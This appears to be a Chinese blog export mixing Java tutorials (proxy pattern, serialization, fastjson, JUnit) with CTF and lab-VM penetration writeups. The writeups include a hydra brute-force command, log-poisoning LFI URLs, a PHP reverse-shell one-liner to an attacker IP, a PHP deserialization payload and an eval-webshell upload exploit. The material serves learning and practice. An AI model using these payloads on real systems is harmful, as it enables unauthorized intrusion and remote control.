这时候我们突然想要添加新功能，打印我们使用了什么功能改怎么办？我们很明显可以这样做： 1234public void query() &#123; System.out.println(&quot;使用了查询功能&quot;); System.out.println(&quot;查询了一个用户&quot;); &#125; 但是很明显这种方式非常笨拙，并且如果是更多的功能，程序员就必须手写，并且一段一段的复制差不多的代码！（这里四个输出语句就让我感觉有点烦躁了 我们结合代理模式，其实可以很优雅的解决它： 12345678910111213141516171819202122232425262728293031323334package Proxy2;public class UserServiceProxy implements UserService &#123; private UserServiceImp userServiceImp; public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125; public void add() &#123; log(&quot;add&quot;); userServiceImp.add(); &#125; public void delete() &#123; log(&quot;删除&quot;); userServiceImp.delete(); &#125; public void update() &#123; log(&quot;更新&quot;); userServiceImp.update(); &#125; public void query() &#123; log(&quot;查询&quot;); userServiceImp.query(); &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]执行了&quot;+name+&quot;方法&quot;); &#125;&#125; 这时候我们就解决了功能的需求，并且，我们没有修改任何一行原代码，却上线了新的功能，除此之外，我们的代码拓展性依然很高，需要添加新功能只需要添加新的代理层即可，这时候我们将引出了第三个思想： 任何功能的添加，修改，引入新的代理层来解决，客户只需要去导入最后一个代理增即可","categories":[],"tags":[{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"Potato和Tomato渗透","slug":"Potato和Tomato渗透","date":"2020-11-08T13:00:22.000Z","updated":"2020-12-16T10:57:45.298Z","comments":true,"path":"2020/11/08/Potato和Tomato渗透/","link":"","permalink":"http://example.com/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/","excerpt":"","text":"Potato渗透也是经典的dirb和nmap扫一波 nmap的结果 dirb的结果 也就发现了一个info.php能用，访问一些是phpinfo，呃，那再看看nmap，开了7120端口，看看，啥都没有，只能通过hypdra进行爆破咯，呃，账号密码都不知道，只能试试看了 1hydra 192.168.1.113 ssh -s 7120 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f 登陆上之后查看uname -a 查看能不能提权 看见内核为ubuntu3.多，这种老版本一般可以直接提，尝试搜索 123potato@ubuntu:/tmp$ uname -aLinux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux searchsploit Ubuntu 3.13.0 利用-p指令找到存放位置，之后我们就可以直接拿下exp了，再上传到靶机的tmp目录下（因为tmp目录大部分情况下是777权限 成功拿下！ Tomato渗透首先经典drib和nmap扫一波 nmap： 1nmap -sS -v -T4 -Pn -A -p 0-65535 发现8888端口和21，开了其他tcp和ssh的端口,但是都没法用，在info.php下发现文件包含 尝试包含了一下etc/passwd就卡住了，不知道该怎么做。。 这里记录下各个log的文件 1234567891011121314151617189)/var/run/utmp 记录着现在登录的用户;10)/var/log/lastlog 记录每个用户最后的登录信息;11)/var/log/btmp 记录错误的登录尝试;12)/var/log/dmesg内核日志;13)/var/log/cpus CPU的处理信息；14)/var/log/syslog 事件记录监控程序日志；15)/var/log/auth.log 用户认证日志；16)/var/log/daemon.log 系统进程日志；17)/var/log/mail.err 邮件错误信息；18)/var/log/mail.info 邮件信息；19)/var/log/mail.warn 邮件警告信息；20)/var/log/daemon.log 系统监控程序产生的信息;21)/var/log/kern 内核产生的信息;22)/var/log/lpr 行打印机假脱机系统产生的信息; 根据大佬的payload，其实我们可以知道，在当前环境下我们可以控制的log文件只有auth.log,因为只有个这个日志我们可以操作，比如我们写入一句话，再进行包含的话，不就是执行了命令了吗（这个思路真的骚 所以我们马上操作一波，这里我用xshell脸上·的 马上执行命令： 1view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls 再之后为了能够传脚本啥的啊，我们执行一波反弹shell： 1php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; urlencode一下 1php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27; 弹到自己本机上即可。 接下来我们求一个交互式的shell，发现python3可以用，所以接下来用Python打开一个交互式的shell 1python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 之后uname -a 看内核，exp一冲就完事了 1grep -nr &quot;flag&#123;&quot; / 2&gt;/dev/null 我他妈直接一把梭","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Nagios渗透","slug":"Nagios渗透","date":"2020-11-08T11:38:31.000Z","updated":"2020-11-08T12:44:22.850Z","comments":true,"path":"2020/11/08/Nagios渗透/","link":"","permalink":"http://example.com/2020/11/08/Nagios%E6%B8%97%E9%80%8F/","excerpt":"","text":"第一步：经典NMAP 1nmap -sS -v -T4 -Pn -A -p 0-65535 172.192.168.235.135 drib 1dirb http://192.168.29.128/ Nmap的结果如下： 而dirb的结果： 感觉有点鸡肋啊..dirb的结果 第二步WTM直接用exp库 1searchsploit nagios msfconsole 1search nagios 之后使用show options查看我们需要填写什么 查看还需要设置的选项 show options，为YES且空的就是还需要我们设置的。 可以看到下图中RHOST参数还未设置内容 发现这个需要设置密码，于是尝试测试默认密码登陆NagiosXI，在该文章中得到账号为NagiosAdmin 1https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html 密码为admin 这里讲一下msfconsole怎么用的.. msfconsole首先search 漏洞 show options 可以查看有什么条件我们还没有设置 再之后设置rhost和lhost，其中rhost为被攻击的机子 lhost为攻击机，也就是我们的kali 之后直接run，发现失败 123] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.[*] Exploit completed, but no session was created. 于是把我们刚刚得到的password填写上去admin 得到run之后执行shell，whoami查看权限就是root了","categories":[],"tags":[]},{"title":"太湖杯easyweb","slug":"太湖杯easyweb","date":"2020-11-07T11:47:54.000Z","updated":"2020-11-17T06:15:31.811Z","comments":true,"path":"2020/11/07/太湖杯easyweb/","link":"","permalink":"http://example.com/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/","excerpt":"","text":"感觉太湖杯的题目都挺难的..这次自己制作出来一道题，是一道SSTI，做的时候一开始还以为是nodejs进行命令执行什么的 难点这道题的难点主要是过滤掉了花括号，和双引号等。 做题思路这道题初看就感觉是一道SSTI，但是刚开始的时候被花括号卡住了，搞得我以为是是其他题目，结果相当想到A1CTF独角兽那道题目，才有了思路，首先，我们可以确定的是，我们输入一些花里胡哨的东西会被转换为标准的字符串输出，如图： 于是我联想到可以通过输入类似的花括号的utf8编码下的字符串进行绕过： 1https://www.compart.com/en/unicode/U+FE5C 其中这一行 UTF-8 Encoding: 0xEF 0xB9 0x9C 我们将0x修改为百分号即可 之后就是正常的SSTI了，我们将不需要引号的payload往上上一甩就行了 事后事后发现其实还可以利用这种方式进行命令执行：","categories":[],"tags":[{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"JavaSerialize","slug":"JavaSerialize","date":"2020-11-02T12:10:22.000Z","updated":"2020-11-03T12:49:27.595Z","comments":true,"path":"2020/11/02/JavaSerialize/","link":"","permalink":"http://example.com/2020/11/02/JavaSerialize/","excerpt":"","text":"JAVA当中对于文件的处理都是通过IO流进行操作的 一些IO流的API FileOutputStream 写入流，我们用该流可以写入内容到文件当中 FileInputStream 读取流 ObjectOutputStream 该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了序列化和反序列化操作。 ObjectInputStream 反序列化并打印数据 JAVA反序列化过程首先我们要明白，Java的序列化与反序列化的过程是如何产生的，我们可以编写如下代码： 123456789101112131415161718192021222324import java.io.*;public class demo1&#123; public static void main(String[] args) throws Exception &#123; String obj = &quot;ls &quot;; // 将序列化对象写入文件aa.ser中 FileOutputStream fos = new FileOutputStream(&quot;aa.ser&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // aa.ser中读取数据 FileInputStream fis = new FileInputStream(&quot;aa.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象obj,注意这里使用强转 String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); &#125;&#125; 通过这串代码，我们将数据ls传入到了aa.ser当中，并且将其重新释放了出来。我们成功通过写入序列化文件并将其成功返回。 实现Serializable和Externalizable接口的类的对象才能被序列化。故我们写一个例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import java.io.*;import java.text.MessageFormat;public class Demo2 &#123; public static void SerializePerson() throws IOException &#123; Person person = new Person(); person.setAge(19); person.setName(&quot;sakani&quot;); // person.setSex(true); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;Demo2.txt&quot;)); oos.writeObject(person); &#125; //因为文件可能不存在，此时需要处理异常 public static Person UnSerializePerson() throws IOException, ClassNotFoundException &#123;// 读取文件 FileInputStream fileInputStream = new FileInputStream(new File(&quot;Demo2.txt&quot;));// 到这一步来读取了文件流，下一步将其强转回对象 ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);// readObject 是用来读取该流当中的对象 Person person2 = (Person)objectInputStream.readObject(); System.out.println(person2.getAge()); return person2; &#125; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; SerializePerson();// 这个方法用于序列化函数 Person person2 = UnSerializePerson(); System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;,person2.getName(),person2.getAge())); &#125;&#125;//必须要实现序列化接口才可以进行序列化class Person implements Serializable &#123; private String name; private int age; private boolean sex; public Person() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public boolean isSex() &#123; return sex; &#125; public void setSex(boolean sex) &#123; this.sex = sex; &#125;&#125; Java命令执行函数1.java.lang.Runtime12345678910111213141516171819202122232425262728293031323334353637383940import org.junit.Test;import java.io.IOException;import java.io.InputStream;public class RuntimeTest &#123; @Test public void test1() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;calc&quot;,&quot;&amp;&quot;,&quot;notepad&quot;&#125;); &#125; @Test public void test2() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;cmd /c calc &amp; notepad&quot;); &#125; @Test public void test3() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;cmd.exe /k calc &amp; notepad&quot;); &#125; @Test public void test4() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); Process start = runtime.exec(&quot;ping sakani.top&quot;); InputStream inputStream = start.getInputStream(); byte[] res = new byte[1024]; inputStream.read(res); System.out.println(new String(res,&quot;gbk&quot;)); &#125;&#125;class Test1&#123;&#125; 注意，第一种方式告诉我们可以用数组来传入命令，第二种则是告诉字符串的方式，第四种则是意味着我们可以执行反弹shell,但是用该方法的时候我只得到了一条ping的数据，如图所示，所以我认为可能并不是很靠谱 2.java.lang.ProcessBuilder123456789101112@Testpublic void test5() throws IOException &#123; ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,&quot;calc&quot;); Process start = processBuilder.start();&#125;@Testpublic void test6() throws IOException &#123; ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd.exe &quot;,&quot;/c calc&quot;); processBuilder.start();&#125; 该方法也可以成功执行函数，但需要注意的是，使用的时候需要指定两个参数，第一个是执行什么文件，第二个才是命令 3.java.lang.Processlmpl这种方法是ProcessBuilder的父类，但是因为其为私有类，我们需要获取的时候只能通过反射的方式来获取 123456789@Testpublic void test7() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class&lt;?&gt; aClass = Class.forName(&quot;java.lang.ProcessImpl&quot;); Method start = aClass.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); start.setAccessible(true); start.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, null, null, false);&#125; 让我比较疑惑的是这里为什么没有使用cmd，直接使用的null，却可以成功得到运行呢？ 稍微审计了以下源码，看到了如下： 123456static Process start(String cmdarray[], //注意这里，传入的就是cmdarray java.util.Map&lt;String,String&gt; environment, String dir, ProcessBuilder.Redirect[] redirects, boolean redirectErrorStream) throws IOException 顺便补充一下反射的几个知识： class.forName用于反射类，指定类名即可 class.getDeclaredMethod 用于映射类中的方法 invoke ，开始调用该方法， 传入参数即可使用 4. javax.script.ScriptEngineMana本质上还是使用上面的三种方法： 12345@Testpublic void test8() throws ScriptException &#123; Object scriptEngineManager = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&quot;); System.out.println(scriptEngineManager);&#125; 这里我比较惊讶，为什么输出语句也可以执行命令呢？","categories":[],"tags":[]},{"title":"fastJson","slug":"fastJson","date":"2020-11-02T08:11:59.000Z","updated":"2020-11-17T06:17:04.494Z","comments":true,"path":"2020/11/02/fastJson/","link":"","permalink":"http://example.com/2020/11/02/fastJson/","excerpt":"","text":"JUnit4在学习fastjson之前，感觉有必要先学习一下Junit4的注解，自从SpringBoot之后注解大量的被使用， JUnit出现的与因为main方法测试很不方便，摘自百度的部分： 12用main方法测试的话就很不方便，想测试全部方法的话就得把测试代码全部写到里，或者你测一个重写一次。且更重要的是，这样会使测试代码与运行逻辑代码混在一起，不规范。使用junit就方便多了,这是单元测试，你想测哪个方法就写一个对应的测试方法，然后用junit运行。每个方法之间是独立的，非常灵活。而且测试方法一般不会直接写在原类中，而是单独的测试类，这样测试代码就完全与逻辑代码分开了。 而在Junit4大量使用了从Java5中开始使用的注解，如下是JUnit4常用的注解： before，test，after Before：初始化方法，针对每个测试方法，都会执行一遍 Test: 代替main函数，可以让我们灵活的测试某部分代码,注意，测试的时候不要写一个Test类！！！！，否则因为会有限选择同包下的test类，导致报错,@Test方法所在类中,不能存在有参数构造函数,无参构造可以存在 After：在方法结束之后执行，每次都会执行！ 例子： 12345678910111213141516171819202122package com.ys.pojo;import org.junit.After;import org.junit.Before;import org.junit.Test;public class Person&#123; @Before public void before()&#123; System.out.println(&quot;最先被执行！&quot;); &#125; @Test public void test()&#123; System.out.println(&quot;wdnmd&quot;); &#125; @After public void after()&#123; System.out.println(&quot;我之后才会被执行呢&quot;); &#125;&#125; 除此之外，Test注解还允许我们添加参数，检测是否抛出某部分异常： 例子： 12345678 @Test(expected = Exception.class) public void test2()&#123; int[] array = new int[3]; for (int i = 0; i &lt; 5; i++) &#123; array[i] = i; &#125; &#125;&#125; 当代码出现异常的时候，则不会抛出异常，相反的，如果这段代码正常抛出，就会抛出异常了。 beforeclass，afterclass BeforeClass: 在所有类被执行之前执行，只会执行一次，同时必须为static静态方法（因为他们就相当于此） AfterClass: 在所有类被执行之后执行 1234567891011121314151617181920212223242526272829303132333435363738394041package com.ys.pojo;import org.junit.*;import java.lang.reflect.Array;public class Person&#123; @Before public void before()&#123; System.out.println(&quot;我就相当于构造器！&quot;); &#125; @Test public void test1()&#123; System.out.println(&quot;我是test1，我被执行了&quot;); &#125; @After public void after()&#123; System.out.println(&quot;我之后才会被执行&quot;); &#125; @Test(expected = Exception.class) public void test2()&#123; int[] array = new int[3]; for (int i = 0; i &lt; 5; i++) &#123; array[i] = i; &#125; System.out.println(&quot;我是test2执行了！&quot;); &#125; @BeforeClass public static void beforeClass()&#123; System.out.println(&quot;我在所有的前面被执行，并且我只会执行一次！&quot;); &#125; @AfterClass public static void afterClass()&#123; System.out.println(&quot;我在最终所有结束之后才会被执行&quot;); &#125;&#125; Ignore Ignore可以让我们暂时的禁用特定的类，被注解之后的类将不再被执行 Ignore经过我测试，只有当他放在测试类前才可以生效。 例子： 而如果我们放在其他类前面： 我们可以发现依然被执行了！ Runwith Runwith放在测试类之前，用于确定这个类该如何运行，我们也可以不标注，将会使用默认的运行容器 可以看这篇文章来理解： 1https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg Fastjson Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。 Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。 Fastjson 源码地址：https://github.com/alibaba/fastjson Fastjson 中文 Wiki：https://github.com/alibaba/fastjson/wiki/Quick-Start-CN 也就是说，程序员们用这个程序就是为了传运JSON格式的对象，呃，感觉像序列化一样了？ 将JAVA对象转换成json格式123456789101112131415161718192021222324252627package com.ys.pojo;import com.alibaba.fastjson.JSON;import org.junit.Before;import org.junit.Test;import java.util.ArrayList;import java.util.Date;import java.util.List;public class Fortest &#123; private List&lt;JavaToJson&gt; listOfJava = new ArrayList&lt;JavaToJson&gt;(); @Before public void setUp()&#123; listOfJava.add(new JavaToJson(18,&quot;wndmd&quot;,new Date())); listOfJava.add(new JavaToJson(20,&quot;Json!&quot;,new Date())); &#125; @Test public void test()&#123; String list = JSON.toJSONString(listOfJava); System.out.println(list); &#125;&#125; 注意，上述代码需要另外起一个类，test不允许在有参构造的类中出现 得到输出结果： 1234567891011[ &#123;&quot;Age&quot;:18, &quot;DATE OF BIRTH&quot;:1604309562809, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;Age&quot;:20, &quot;DATE OF BIRTH&quot;:1604309562809, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] 我们还可以格式化自定义输出，控制字段的排序。 我们更新bean并添加如下字段： 123456789public class JavaToJson &#123; @JSONField(name = &quot;Age&quot;,serialize = false) private int age; @JSONField(name = &quot;FULL NAME&quot;,ordinal = 2) private String fullName; @JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1) private Date date; 注意在这里我们添加serialize = false，这里是默认我们添加序列化，如果我们设置为false，该字段将不会被显示。 而ordinal，则是用于规定格式化的顺序，需要注意的是，如果你想控制，最好就全部都使用该属性修饰，或者你自己干脆写的时候就从上向下写，不然的话，默认从上向下执行，只会再按照ordinal限定的顺序排列 上述代码输出： 12345678910[ &#123; &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] 如果将serialize的false去掉之后，他还是第一个被执行： 123456789101112[ &#123; &quot;Age&quot;:18, &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;Age&quot;:20, &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] 作用对象@JSONField 的作用对象: Field Setter 和 Getter 方法 需要注意如下两点： 注意：FastJson 在进行操作时，是根据 getter 和 setter 的方法进行的，并不是依据 Field 进行。 注意：若属性是私有的，必须有 set 方法。否则无法反序列化。 跟进JSONField查看源码，可以知道我们允许指定很多东西=。=： 1234567891011121314151617181920212223242526272829public @interface JSONField &#123; int ordinal() default 0; String name() default &quot;&quot;; String format() default &quot;&quot;; boolean serialize() default true; //注意这里，反序列化！ boolean deserialize() default true; SerializerFeature[] serialzeFeatures() default &#123;&#125;; Feature[] parseFeatures() default &#123;&#125;; String label() default &quot;&quot;; boolean jsonDirect() default false; Class&lt;?&gt; serializeUsing() default Void.class; Class&lt;?&gt; deserializeUsing() default Void.class; String[] alternateNames() default &#123;&#125;; boolean unwrapped() default false; String defaultValue() default &quot;&quot;;&#125; 配置方式FieldInfo 可以配置在 getter/setter 方法或者字段上。例如： 配置在 getter/setter 上12345678public class A &#123; private int id; @JSONField(name=&quot;ID&quot;) public int getId() &#123;return id;&#125; @JSONField(name=&quot;ID&quot;) public void setId(int value) &#123;this.id = id;&#125;&#125; 配置在 field 上1234567public class A &#123; @JSONField(name=&quot;ID&quot;) private int id; public int getId() &#123;return id;&#125; public void setId(int value) &#123;this.id = id;&#125;&#125; 创建 JSON 对象创建 JSON 对象非常简单，只需使用 JSONObject（fastJson提供的json对象） 和 JSONArray（fastJson提供json数组对象） 对象即可。 虽然JSONArryay也可以创建一个JSON对象，但我觉得书写方式不够美观，其中如下： 123456789101112@Testpublic void whenGenerateJson_thanGenerationCorrect() throws ParseException &#123; JSONArray jsonArray = new JSONArray(); for (int i = 0; i &lt; 2; i++) &#123; JSONObject jsonObject = new JSONObject(); jsonObject.put(&quot;AGE&quot;, 10); jsonObject.put(&quot;FULL NAME&quot;, &quot;Doe &quot; + i); jsonObject.put(&quot;DATE OF BIRTH&quot;, &quot;2016/12/12 12:12:12&quot;); jsonArray.add(jsonObject); &#125; String jsonOutput = jsonArray.toJSONString();&#125; JSON 字符串转换为 Java 对象fastjson允许我们可以将前端传来的数据转换变成JSON数据，同样的也允许我们把后端数据转换为JSON字符串丢给前端。 123456789101112 @Test public void jsonToJava()&#123; JavaToJson miaomiaomiao = new JavaToJson(21, &quot;miaomiaomiao&quot;, new Date()); String jsonObject = JSON.toJSONString(miaomiaomiao);// System.out.println(jsonObject);// 这前面的part我们将数据转换成了JSON数据 JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);// 指定需要转换的JSON字符串，并且指定原型,这样的话一个JAVA对象就指定好了 System.out.println(newJavaObject.getAge()); System.out.println(newJavaObject.getFullName()); &#125; 使用ContextValuFilter配置JSON转换在有些场景中，对Value做过滤，需要获得所述JavaBean的信息，而我们可能想要过滤某些信息，便可以使用该方法进行操作了。 123456789101112131415161718192021222324@Before public void before()&#123; listOfJava.add(new JavaToJson(31,&quot;wdnmd&quot;,new Date())); listOfJava.add(new JavaToJson(33,&quot;wd&quot;,new Date())); &#125; @Test public void givenContextFilter_whenJavaObject_thanJsonCorrect() &#123; ContextValueFilter valueFilter = new ContextValueFilter () &#123; public Object process( BeanContext context, Object object, String name, Object value) &#123; if (name.equals(&quot;DATE OF BIRTH&quot;)) &#123; return &quot;NOT TO DISCLOSE&quot;; &#125; if (value.equals(&quot;wdnmd&quot;)) &#123; return ((String) value).toUpperCase(); &#125; else &#123; return null; &#125; &#125; &#125;; String jsonOutput = JSON.toJSONString(listOfJava, valueFilter); System.out.println(jsonOutput); &#125; 经过上述代码的操作，我们的时间将会修改为NOT TO DISCLOSE，并且数据中不包含wdnmd的将会被过滤,具体输出如下： 1234567891011121314[ &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot;,&quot;FULL NAME&quot;:&quot;wdnmd&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;]","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"NPUCTF2020","slug":"NPUCTF2020","date":"2020-10-30T01:00:15.000Z","updated":"2020-10-31T07:01:18.480Z","comments":true,"path":"2020/10/30/NPUCTF2020/","link":"","permalink":"http://example.com/2020/10/30/NPUCTF2020/","excerpt":"","text":"web🐕列表内容复制粘贴，丢python里面跑一轮就行了 123list = [102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125]for i in list: print(chr(i),end=&#x27;&#x27;) 啊，别看了，这上面太丢人了。。。原来是因为这是最后一步， ReadlezPHP这道题目和之前在网鼎杯做的phpweb很像，一样的是进行动调： 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); flag说是在phpinfo当中,构造如下： 12345678910111213141516171819&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;phpinfo()&quot;; $this-&gt;b = &quot;assert&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$a = new HelloPhp();echo serialize($a); Ezinclude 第一步，这里说是cookies里面有一个hash，是hash拓展攻击： 123456789101112131415import requestsimport hashpumpyimport urlliburl=&#x27;http://ha1cyon-ctf.fun:30004/&#x27;for i in range(40): a,b=hashpumpy.hashpump(&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;,&#x27;123444&#x27;,&#x27;1&#x27;,i) req=requests.get(url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a)) if &#x27;username/password error&#x27; not in req.text: print(req.text,url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a)) ?然而实际做的时候把cookies的值丢进去当作password的就过去了。 读取到三个php文件： flflflflag.php 12345678&lt;?php$file=$_GET[&#x27;file&#x27;];if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123; die(&#x27;nonono&#x27;);&#125;@include($file);echo &#x27;include($_GET[&quot;file&quot;])&#x27;;?&gt; index.php 123456789101112131415161718&lt;?phpinclude &#x27;config.php&#x27;;@$name=$_GET[&#x27;name&#x27;];@$pass=$_GET[&#x27;pass&#x27;];if(md5($secret.$name)===$pass)&#123; echo &#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;flflflflag.php&quot;; &lt;/script&gt;&#x27;;&#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt; config.php 1234&lt;?php$secret=&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;;?&gt; 用dirb还能扫出来一个dir.php 123456789&lt;body&gt; array(2) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; &#125; include($_GET[&quot;file&quot;])&lt;/body&gt; 这里会列出tmp目录下的所有文件， 那看来还是要写🐎进去啊，可是伪协议被过滤了该怎么写🐎呢？ 参考文章： 1https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046 从这篇文章中我们可以知道，当PHP陷入崩溃的时候他会自动的重启，清理掉自己的内存，但是与此同时这就会导致PHP会停止自己手头的工作，这样的话于此同时我们直接POST一段数据，将会被php保存至tmp目录下没有停下。随机生成一个文件，但是又根据题目的dir.php，可以让我们看见tmp目录下有什么，所以直接包裹即可~ 抄来的exp： 123456789101112import requestsfrom io import BytesIOimport repayload = &quot;&lt;?php eval($_POST[a]);?&gt;&quot;file_data=&#123; &#x27;file&#x27;: BytesIO(payload.encode())&#125;url=&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;try: r=requests.post(url=url,files=file_data,allow_redirects=False)except: print(1) 重点就是用string.strip_tags这一点构造出php的内存溢出即可得到。之后访问dir.php可以看见有什么文件成功上传： 进行文件包含即可 flag一样的PHP info（）当中","categories":[],"tags":[]},{"title":"MRCTF2020","slug":"MRCTF2020","date":"2020-10-29T09:51:51.000Z","updated":"2020-10-29T12:44:36.831Z","comments":true,"path":"2020/10/29/MRCTF2020/","link":"","permalink":"http://example.com/2020/10/29/MRCTF2020/","excerpt":"","text":"怎么说呢。。是新手题目，又不太像，有些题目脑洞有点大 1.套娃读源码： 12345678$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125; 其中可以看见过滤_和%5f，那我们编码绕过就无办法了啊，但是找到参考文献： 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html 其中对这种的绕过 于是我们构造空格来绕过： 1&#x2F;?b%20u%20p%20t&#x3D;23333%0a 之后在secrettw.php中，JSfcuk翻译即可得到让传值读取源码： 读取到源码如下： 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function 